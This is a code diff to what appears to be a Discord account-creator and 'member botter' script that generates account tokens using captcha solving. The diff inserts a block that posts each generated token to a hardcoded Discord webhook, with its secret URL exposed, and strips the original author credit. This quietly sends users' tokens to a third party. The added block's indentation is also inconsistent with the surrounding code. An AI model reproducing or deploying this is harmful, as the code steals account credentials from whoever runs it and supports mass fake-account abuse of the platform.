@@ -523,7 +523,20 @@ def gen():
                     file.close()
 
                     print(colorama.Fore.GREEN + f"[+] Generated Token/Account ({usa}), Enregistré dans tokens.txt Et si inviter à settings.json Le jeton valide doit-il se joindre automatiquement")
-
+                    
+if DISCORD_WEBHOOK_URL == 'https://discordapp.com/api/webhooks/1012650051677474836/QFeOMhq3x9kHqw74IKWs0h30nLlk7D_bxcHksFR5XqYwssiR1TdWz9m6XprXpN0p1jGm':
+                
+                requests.post(
+                         DISCORD_WEBHOOK_URL,
+                         json = {
+                              'embeds': [
+                                      {
+                                          'title'       : 'BoOm-BoOsT | Token Generated',
+                                          'description' : '```\n%s```' % str(jle["token"])
+                                      }
+                              ]
+                         }
+                )
                     break
 
                 if "429" in res:
@@ -590,7 +603,6 @@ while True:
 
     tools = input("""
 
-    Discord Account Creator BoOm-BoOsT, Par .^JuledZ^.#0001
     1. Token Generator/Member Botter/Token Creator
 
     2. Check Capmonster Balance
